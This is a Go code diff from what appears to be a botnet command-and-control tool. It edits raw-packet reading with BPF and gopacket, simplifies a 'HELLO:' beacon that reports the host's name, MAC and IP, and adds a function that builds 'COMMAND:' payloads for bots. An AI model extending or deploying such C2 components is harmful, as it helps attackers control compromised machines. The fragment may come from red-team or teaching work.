@@ -14,11 +14,11 @@ import (
 	"strings"
 	"time"
 
+	"golang.org/x/net/bpf"
 	"golang.org/x/sys/unix"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
-	"golang.org/x/net/bpf"
 )
 
 // Function to do this err checking repeatedly
@@ -68,13 +68,12 @@ func ReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	// Parse packet... hopefully
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-		// Add logic to make sure this is my own shit
+		// Make sure this is my packet
 		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
 			return packet
 		}
 		return nil
 	}
-
 	return nil
 }
 
@@ -341,13 +340,19 @@ func GetRouterMAC() (net.HardwareAddr, error) {
 //
 //	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
 //			we are dealing with NAT. This will be handled by the C2 parsing
-func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP, count int) (hello string) {
+func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Fatal("Hostname not found...")
 	}
 
-	hello = "HELLO: " + strconv.Itoa(count) + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
+	hello = "HELLO: " + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
 
 	return hello
+}
+
+// CreateCommand creates the payload for sending commands to bots
+func CreateCommand(cmd string) (command string) {
+	command = "COMMAND: " + cmd
+	return command
 }
